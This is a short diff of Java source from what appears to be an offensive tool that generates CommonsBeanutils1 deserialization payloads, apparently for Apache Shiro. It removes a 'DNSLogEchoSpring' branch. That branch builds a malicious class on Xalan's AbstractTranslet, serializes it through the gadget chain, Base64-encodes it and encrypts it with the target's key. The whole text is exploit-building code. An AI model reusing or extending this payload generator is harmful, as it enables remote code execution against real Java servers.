@@ -131,23 +131,6 @@ public class CommonsBeanutils1 {
             String data = Base64.getEncoder().encodeToString(payload);
             String result = Tools.CBC_Encrypt(key, data);
             return result;
-        } else if (echoPayload.equals("DNSLogEchoSpring")) {
-            // 获取回显类型
-            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
-            ctClass = dnsLogEchoSpring.genPayload(pool);
-
-            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
-                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-            } else {
-                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-            }
-            ctClass.setSuperclass(superClass);            // 设置父类
-
-            // 生成反序列化payload
-            byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
-            String data = Base64.getEncoder().encodeToString(payload);
-            String result = Tools.CBC_Encrypt(key, data);
-            return result;
         }
 
         return null;
